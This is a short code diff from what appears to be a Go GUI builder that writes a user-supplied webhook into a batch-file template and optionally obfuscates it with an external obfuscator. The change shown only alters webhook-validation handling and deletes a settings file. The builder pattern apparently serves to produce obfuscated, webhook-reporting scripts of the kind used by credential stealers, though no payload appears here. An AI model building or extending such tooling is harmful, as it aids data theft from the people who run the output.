@@ -19,7 +19,7 @@ func BuildBatchFile(a fyne.App, webhook string, obfuscate bool) {
 		fmt.Println(err)
 	}
 	if !(utils.TestWebhook(a, webhook)) {
-		return
+		utils.MakeErrorMessage(a, "Invalid webhook!")
 	}
 	batchCode := utils.GetBatCode()
 	batchCode = strings.Replace(batchCode, "YOUR_WEBHOOK_HERE2", webhook, -1)
@@ -53,6 +53,8 @@ func obfuscateCode(file string) error {
 	if err != nil {
 		return err
 	}
+
+	_ = os.Remove("settings.json")
 
 	err = os.Remove(somalifuscatorPath)
 	if err != nil {
